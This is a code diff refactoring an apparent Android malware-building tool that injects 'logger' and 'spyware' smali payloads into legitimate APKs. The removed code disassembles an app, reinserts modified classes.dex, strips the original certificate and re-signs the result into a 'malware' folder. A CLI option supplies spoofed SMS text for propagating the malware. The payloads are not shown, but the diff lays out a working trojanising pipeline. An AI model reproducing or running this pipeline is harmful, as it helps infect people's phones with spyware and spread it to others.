@@ -15,20 +15,18 @@
 
 import argparse
 import os
-import re
 import shutil
-import subprocess
 import sys
-import ruamel.std.zipfile as zipfile
 
 from payloads.logger import Logger
 from payloads.spyware import Spyware
-from utils import config, logger, util
+from reverse_engineer import reverse_engineer
+from utils import config, logger
 
-# Instanciate my custom output logger
+# Instanciate a custom output logger
 logger = logger.get_logger()
 
-# List of implemented payloads
+# Implemented payloads
 payloads = [
     "logger",
     "spyware"
@@ -65,7 +63,6 @@ def parse_args():
     """
     Parse and validate user command line.
     """
-    # Top-level parser
     parser = argparse.ArgumentParser(
         description="Android assembly code (smali) injector"
     )
@@ -135,7 +132,7 @@ def parse_args():
         help="logger command"
     )
 
-    parser_payload_logger.set_defaults(payload='logger')
+    parser_payload_logger.set_defaults(payload_name='logger')
 
     # Parser for the "payload->logger" command
     parser_payload_spyware = parser_payloads.add_parser(
@@ -147,7 +144,7 @@ def parse_args():
         "-ppg",
         "--propagate",
         dest="propagate",
-        help="spoofed SMS to send for malware propagation",
+        help="spoofed SMS to send for the malware propagation",
         required=False,
         type=str
     )
@@ -161,128 +158,9 @@ def parse_args():
         type=str
     )
 
-    parser_payload_spyware.set_defaults(payload='spyware')
+    parser_payload_spyware.set_defaults(payload_name='spyware')
 
     return parser.parse_args()
-
-# TODO: Improve the returned output formatting - replace . with / and add .smali
-def get_main_activity(app):
-    """
-    Returns the main activity from the AndroidManifest.xml.
-    """
-    try:
-        output = subprocess.check_output(
-            "aapt dump badging {0}".format(app),
-            shell=True).decode("UTF-8")
-        regex = re.compile("launchable-activity:.*")
-        result = regex.search(output).group(0)
-
-    except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
-        sys.exit(1)
-
-    return result
-
-
-def disassemble(app_absolute_path, app_name):
-    if not os.path.exists(config.TMP_FOLDER):
-        os.makedirs(config.TMP_FOLDER)
-
-    try:
-        instruction = (
-            "java -jar ../libs/baksmali-2.2.1.jar disassemble "
-            "--parameter-registers false -o {} {}".format(
-                os.path.join(config.TMP_FOLDER, app_name),
-                app_absolute_path)
-        )
-        subprocess.check_output(instruction, shell=True)
-
-        # Create a copy of the legitimate app disassembled code
-        if config.DEBUG_MODE == 1:
-            if not os.path.exists(config.TMP_FOLDER):
-                os.makedirs(config.TMP_FOLDER)
-
-            util.copy(os.path.join(config.TMP_FOLDER, app_name),
-                      os.path.join(config.DEBUG_FOLDER, app_name))
-
-    except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
-        sys.exit(1)
-
-def reassemble(payload):
-    # Create a copy of the infected app source code
-    if config.DEBUG_MODE == 1:
-        util.copy(os.path.join(config.TMP_FOLDER, payload.app_name),
-                  os.path.join(config.DEBUG_FOLDER, payload.app_name +
-                               "_malware"))
-    try:
-        # Assemble the smali files into classes.dex
-        instruction = (
-            "java -jar ../libs/smali-2.2.1.jar assemble "
-            "{} -o {}".format(
-                os.path.join(config.TMP_FOLDER, payload.app_name),
-                os.path.join(config.TMP_FOLDER, "classes.dex"))
-        )
-        subprocess.check_output(instruction, shell=True)
-
-        # Create a copy of the app - insert classes.dex, remove the cert and re-sign
-        util.copy(payload.app_absolute_path,
-                  os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"))
-
-        if (payload.name == "spyware"):
-            file_names = [
-                "AndroidManifest.xml"
-                "classes.dex",
-                "META-INF/CERT.RSA",
-                "META-INF/CERT.SF"
-            ]
-
-        else:
-            file_names = [
-                "classes.dex",
-                "META-INF/CERT.RSA",
-                "META-INF/CERT.SF"
-            ]
-
-        util.remove_from_zip(
-            os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"), file_names)
-
-        zin = zipfile.ZipFile(os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"), 'a')
-        zin.write(os.path.join(config.TMP_FOLDER, "classes.dex"), "classes.dex")
-
-    except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
-        sys.exit(1)
-
-    except (zipfile.BadZipfile, zipfile.LargeZipFile) as ex:
-        logger.error("{}".format(ex))
-        sys.exit(1)
-
-
-def sign(payload):
-    try:
-        # Sign the new apk with the certificate within certs/
-        # make sure that the Java JDK is in the environement path
-        instruction = (
-            "jarsigner -verbose -sigalg SHA1withRSA "
-            "-digestalg SHA1 -keystore {} "
-            "-storepass password {} alias_name".format(config.CERT, os.path.join(
-                config.TMP_FOLDER, payload.app_name + ".apk"))
-        )
-        subprocess.check_output(instruction, shell=True)
-
-        # Move the malware app to the MALWARE_FOLDER and remove the TMP_FOLDER
-        if not os.path.exists(config.MALWARE_FOLDER):
-            os.makedirs(config.MALWARE_FOLDER)
-
-        util.copy(
-            os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"),
-            os.path.join(config.MALWARE_FOLDER, payload.app_name + ".apk"))
-        shutil.rmtree(config.TMP_FOLDER)
-
-    except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
-        sys.exit(1)
 
 
 def main():
@@ -292,38 +170,18 @@ def main():
 
         args = parse_args()
 
-        app_absolute_path = os.path.abspath(args.app.name)
-        head, tail = os.path.split(app_absolute_path)
-        app_name = os.path.splitext(tail)[0]
-
         if (args.command == "search"):
             logger.info("identifying the main activity...")
-            main_activity = get_main_activity(app_absolute_path)
+            main_activity = reverse_engineer.get_main_activity(args.app.name)
             logger.success("{}".format(main_activity))
 
         elif (args.command == "payload"):
-            logger.info("disassembling...")
-            logger.warning("this operation might take some time")
-            disassemble(app_absolute_path, app_name)
-
-            if(args.payload == "spyware"):
+            if(args.payload_name == "spyware"):
                 payload = Spyware(args)
-            elif (args.payload == "logger"):
+            elif (args.payload_name == "logger"):
                 payload = Logger(args)
 
-            logger.info("injecting...")
-            methods, edited_methods, log_file = payload.run()
-            logger.success("{} injected in {}/{} method(s)".format(
-                payload.name, edited_methods, methods))
-            logger.success("log file created at {}".format(
-                os.path.abspath(log_file)))
-
-            logger.info("reassembling...")
-            logger.warning("this operation might take some time")
-            reassemble(payload)
-
-            logger.info("signing...")
-            sign(payload)
+            payload.run()
 
     except KeyboardInterrupt:
         logger.error("CTRL+C pressed, exiting...")
